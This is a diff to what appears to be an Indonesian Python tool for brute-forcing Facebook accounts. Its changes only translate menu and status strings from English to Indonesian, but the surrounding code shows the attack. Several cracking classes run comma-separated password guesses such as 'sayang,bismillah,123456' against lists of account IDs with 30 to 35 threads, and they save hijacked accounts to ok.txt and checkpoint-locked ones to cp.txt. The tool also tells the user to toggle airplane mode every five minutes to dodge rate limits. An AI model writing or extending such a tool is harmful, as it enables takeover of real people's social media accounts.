@@ -378,7 +378,7 @@ def pilihcrack(file):
   print((k+"["+p+"03"+k+"]"+p+" Mbasic ("+k+"Slow And Recommended"+p+")"))
   print((k+"["+p+"04"+k+"]"+p+" Mbasic + TTL ("+k+"Slow + TTL"+p+")"))
   print((k+"["+p+"05"+k+"]"+p+" Free Facebook ("+k+"Super Slow/Sangat Lambat"+p+")"))
-  krah=input(k+"\n["+p+"•"+k+"]"+p+"Choose : ")
+  krah=input(k+"\n["+p+"•"+k+"]"+p+"Pilih : ")
   if krah in[""]:
     print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
     pilihcrack(file)
@@ -686,15 +686,15 @@ def defaultua():
         logs()
 
 def menu_user_agent():
-    print("\n%s[%s01%s] %sGet User Agent"%(k,p,k,p))
-    print("%s[%s02%s] %sChange User Agent"%(k,p,k,p))
-    print("%s[%s03%s] %sDelete User Agent"%(k,p,k,p))
-    print("%s[%s04%s] %sCheck User Agent"%(k,p,k,p))
-    print("%s[%s00%s] %sBack/Kembali"%(k,p,k,p))
+    print("\n%s[%s01%s] %sMendapatkan User Agent"%(k,p,k,p))
+    print("%s[%s02%s] %sGanti User Agent"%(k,p,k,p))
+    print("%s[%s03%s] %sHapus User Agent"%(k,p,k,p))
+    print("%s[%s04%s] %sCek User Agent"%(k,p,k,p))
+    print("%s[%s00%s] %sKembali"%(k,p,k,p))
     pilih_menu_user_agent()
 
 def pilih_menu_user_agent():
-    pmu = input("\n%s[%s•%s] %sChoose : "%(k,p,k,p))
+    pmu = input("\n%s[%s•%s] %sMenu : "%(k,p,k,p))
     if pmu in[""]:
         print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
     elif pmu in["1","01"]:
@@ -705,7 +705,7 @@ def pilih_menu_user_agent():
         change_ugent()
     elif pmu in["3","03"]:
         os.system("rm -rf ugent.txt")
-        print("\n%s[%s!%s] %sUser Agent Was Removed"%(k,p,k,p))
+        print("\n%s[%s!%s] %sUser Agent Berhasil Dihapus"%(k,p,k,p))
         input(k+"\n[ "+p+"Back"+k+" ]"+p)
         menu()
     elif pmu in["4","04"]:
@@ -717,12 +717,12 @@ def pilih_menu_user_agent():
 
 def change_ugent():
     os.system("rm -rf ugent.txt")
-    ua = input("\n%s[%s•%s] %sInput User Agent : \n\n%s"%(k,p,k,p,h))
+    ua = input("\n%s[%s•%s] %sMasukanUser Agent : \n\n%s"%(k,p,k,p,h))
     try:
         ugent = open('ugent.txt','w')
         ugent.write(ua)
         ugent.close()
-        jalan("\n%s[%s•%s] %sSuccess Changed User Agent"%(h,p,h,p))
+        jalan("\n%s[%s•%s] %sBerhasil Mengganti User Agent"%(h,p,h,p))
         input(k+"\n[ "+p+"Back"+k+" ]"+p)
         menu()
     except (KeyError, IOError):
@@ -734,9 +734,9 @@ def check_ugent():
     try:
         ungser = open('ugent.txt', 'r').read()
     except IOError:
-        ungser = ("%s[%s!%s] %sUser Agent Not Found"%(k,p,k,p))
+        ungser = ("%s[%s!%s] %sUser Agent Tidak Ada"%(k,p,k,p))
     except:pass
-    print ("\n%s[%s•%s] %sYour User Agent : \n\n%s%s"%(k,p,k,p,h,ungser))
+    print ("\n%s[%s•%s] %sUser Agent Kamu : \n\n%s%s"%(k,p,k,p,h,ungser))
     input(k+"\n[ "+p+"Back"+k+" ]"+p)
     menu()
 
@@ -813,7 +813,7 @@ class crack:
 		self.ko=0
 		print((k+"\n["+p+"?"+k+"]"+p+" Ingin Menggunakan Password Manual [d/m]"))
 		while True:
-			f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
+			f=input(k+"["+p+"•"+k+"]"+p+"  Pilih : ")
 			if f=="":continue
 			elif f=="m":
 				try:
@@ -853,7 +853,7 @@ class crack:
 						except:continue
 				except Exception as e:
 					print(("   %s"%e))
-				print((k+"\n["+p+"+"+k+"]"+p+" Crack Running..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Gunakan mode pesawat (3 detik) setiap 5 menit\n"))
+				print((k+"\n["+p+"+"+k+"]"+p+" Crack Running..."+k+"\n["+p+"+"+k+"]"+p+" Akun OK Tersimpan Dii > ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun CP Tersimpan Di > cp.txt"+k+"\n["+p+"•"+k+"]"+p+" Gunakan mode pesawat (3 detik) setiap 5 menit\n"))
 				ThreadPool(35).map(self.main,self.fl)
 				os.remove(self.apk)
 				exit()
@@ -865,7 +865,7 @@ class crack:
 		else:
 			for i in self.fl:
 				i.update({"pw":self.pw})
-			print((k+"\n["+p+"+"+k+"]"+p+" Crack Running..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Gunakan mode pesawat (3 detik) setiap 5 menit\n"))
+			print((k+"\n["+p+"+"+k+"]"+p+" Crack Running..."+k+"\n["+p+"+"+k+"]"+p+" Akun OK Tersimpan Di > ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun CP Tersimpan Di > cp.txt"+k+"\n["+p+"•"+k+"]"+p+" Gunakan mode pesawat (3 detik) setiap 5 menit\n"))
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
 			exit()
@@ -900,7 +900,7 @@ class crackttl:
 		self.ko=0
 		print((k+"\n["+p+"?"+k+"]"+p+" Ingin Menggunakan Password Manual [d/m]"))
 		while True:
-			f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
+			f=input(k+"["+p+"•"+k+"]"+p+" Pilih : ")
 			if f=="":continue
 			elif f=="m":
 				try:
@@ -940,7 +940,7 @@ class crackttl:
 						except:continue
 				except Exception as e:
 					print(("   %s"%e))
-				print((k+"\n["+p+"+"+k+"]"+p+" Crack Running..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Gunakan mode pesawat (3 detik) setiap 5 menit\n"))
+				print((k+"\n["+p+"+"+k+"]"+p+" Crack Running..."+k+"\n["+p+"+"+k+"]"+p+" Akun OK Tersimpan Di > ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun CP Tersimpan Di > cp.txt"+k+"\n["+p+"•"+k+"]"+p+" Gunakan mode pesawat (3 detik) setiap 5 menit\n"))
 				ThreadPool(35).map(self.main,self.fl)
 				os.remove(self.apk)
 				exit()
@@ -952,7 +952,7 @@ class crackttl:
 		else:
 			for i in self.fl:
 				i.update({"pw":self.pw})
-			print((k+"\n["+p+"+"+k+"]"+p+" Crack Running..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Gunakan mode pesawat (3 detik) setiap 5 menit\n"))
+			print((k+"\n["+p+"+"+k+"]"+p+" Crack Running..."+k+"\n["+p+"+"+k+"]"+p+" Akun OK Tersimpan Di > ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun CP Tersimpan Di > cp.txt"+k+"\n["+p+"•"+k+"]"+p+" Gunakan mode pesawat (3 detik) setiap 5 menit\n"))
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
 			exit()
@@ -1042,7 +1042,7 @@ class crackffb:
 						except:continue
 				except Exception as e:
 					print(("   %s"%e))
-				print((k+"\n["+p+"+"+k+"]"+p+" Crack Running..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Gunakan mode pesawat (3 detik) setiap 5 menit\n"))
+				print((k+"\n["+p+"+"+k+"]"+p+" Crack Running..."+k+"\n["+p+"+"+k+"]"+p+" Akun OK Tersimpan Di > ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun CP Tersimpan Di > cp.txt"+k+"\n["+p+"•"+k+"]"+p+" Gunakan mode pesawat (3 detik) setiap 5 menit\n"))
 				ThreadPool(35).map(self.main,self.fl)
 				os.remove(self.apk)
 				exit()
@@ -1054,7 +1054,7 @@ class crackffb:
 		else:
 			for i in self.fl:
 				i.update({"pw":self.pw})
-			print((k+"\n["+p+"+"+k+"]"+p+" Crack Running..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Gunakan mode pesawat (3 detik) setiap 5 menit\n"))
+			print((k+"\n["+p+"+"+k+"]"+p+" Crack Running..."+k+"\n["+p+"+"+k+"]"+p+" Akun OK Tersimpan Di > ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun CP Tersimpan Di > cp.txt"+k+"\n["+p+"•"+k+"]"+p+" Gunakan mode pesawat (3 detik) setiap 5 menit\n"))
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
 			exit()
@@ -1090,9 +1090,9 @@ class bapi:
   def krah(self,isifile):
     print((k+"\n["+p+"?"+k+"]"+p+" Ingin Menggunakan PasswordManual [d/m]"))
     while True:
-      f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
+      f=input(k+"["+p+"•"+k+"]"+p+" Pilih : ")
       if f in[""," "]:
-        print((k+"["+p+"!"+k+"]"+p+" Nomor Invalid Kentod!!"))
+        print((k+"["+p+"!"+k+"]"+p+" Nomor Invalid Ngab!!"))
         continue
       elif f in["m","M"]:
         try:
@@ -1105,8 +1105,8 @@ class bapi:
               print((k+"["+p+"!"+k+"]"+p+" %s"%e))
               continue
           self.fl=[]
-          print((k+"["+p+"•"+k+"]"+p+" Example/Contoh : sayang,bismillah,123456"))
-          self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
+          print((k+"["+p+"•"+k+"]"+p+" Contoh : sayang,bismillah,123456"))
+          self.pw=input(k+"["+p+"•"+k+"]"+p+" Password : ").split(",")
           if len(self.pw) ==0:
             continue
           for i in self.fs:
@@ -1117,7 +1117,7 @@ class bapi:
         except Exception as e:
           print(("  %s"%e))
           continue
-        print((k+"\n["+p+"+"+k+"]"+p+" Crack Running..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Gunakan mode pesawat (3 detik) setiap 5 menit\n"))
+        print((k+"\n["+p+"+"+k+"]"+p+" Crack Running..."+k+"\n["+p+"+"+k+"]"+p+" Akun OK Tersimpan Di > ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun CP Tersimpan Di > cp.txt"+k+"\n["+p+"•"+k+"]"+p+" Gunakan mode pesawat (3 detik) setiap 5 menit\n"))
         ThreadPool(30).map(self.brute,self.fl)
         #os.remove(self.apk)
         exit()
@@ -1139,7 +1139,7 @@ class bapi:
             except:continue
         except:
           continue
-        print((k+"\n["+p+"+"+k+"]"+p+" Crack Running..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Gunakan mode pesawat (3 detik) setiap 5 menit\n"))
+        print((k+"\n["+p+"+"+k+"]"+p+" Crack Running..."+k+"\n["+p+"+"+k+"]"+p+" Akun OK Tersimpan Di > ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun CP Tersimpan Di > cp.txt"+k+"\n["+p+"•"+k+"]"+p+" Gunakan mode pesawat (3 detik) setiap 5 menit\n"))
         ThreadPool(30).map(self.brute,self.fl)
         os.remove(self.apk)
         exit()
@@ -1200,9 +1200,9 @@ class bapittl:
   def krah(self,isifile):
     print((k+"\n["+p+"?"+k+"]"+p+" Ingin Menggunakan Password Manual [d/m]"))
     while True:
-      f=input(k+"["+p+"•"+k+"]"+p+"Choose : ")
+      f=input(k+"["+p+"•"+k+"]"+p+"Pilih : ")
       if f in[""," "]:
-        print((k+"["+p+"!"+k+"]"+p+" Nomor Invalid Kentod!!"))
+        print((k+"["+p+"!"+k+"]"+p+" Nomor Invalid Ngab!!"))
         continue
       elif f in["m","M"]:
         try:
@@ -1215,8 +1215,8 @@ class bapittl:
               print((k+"["+p+"!"+k+"]"+p+" %s"%e))
               continue
           self.fl=[]
-          print((k+"["+p+"•"+k+"]"+p+" Example/Contoh : sayang,bismillah,123456"))
-          self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
+          print((k+"["+p+"•"+k+"]"+p+" Contoh : sayang,bismillah,123456"))
+          self.pw=input(k+"["+p+"•"+k+"]"+p+" Password : ").split(",")
           if len(self.pw) ==0:
             continue
           for i in self.fs:
@@ -1227,7 +1227,7 @@ class bapittl:
         except Exception as e:
           print(("  %s"%e))
           continue
-        print((k+"\n["+p+"+"+k+"]"+p+" Crack Running..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Gunakan mode pesawat (3 detik) setiap 5 menit\n"))
+        print((k+"\n["+p+"+"+k+"]"+p+" Crack Running..."+k+"\n["+p+"+"+k+"]"+p+" Akun OK Tersimpan Dii > ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun CP Tersimpan Di > cp.txt"+k+"\n["+p+"•"+k+"]"+p+" Gunakan mode pesawat (3 detik) setiap 5 menit\n"))
         ThreadPool(30).map(self.brute,self.fl)
         #os.remove(self.apk)
         exit()
@@ -1249,7 +1249,7 @@ class bapittl:
             except:continue
         except:
           continue
-        print((k+"\n["+p+"+"+k+"]"+p+" Crack Running..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Gunakan mode pesawat (3 detik) setiap 5 menit\n"))
+        print((k+"\n["+p+"+"+k+"]"+p+" Crack Running..."+k+"\n["+p+"+"+k+"]"+p+" Akun OK Tersimpan Di >ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun CP Tersimpan Di > cp.txt"+k+"\n["+p+"•"+k+"]"+p+" Gunakan mode pesawat (3 detik) setiap 5 menit\n"))
         ThreadPool(30).map(self.brute,self.fl)
         os.remove(self.apk)
         exit()
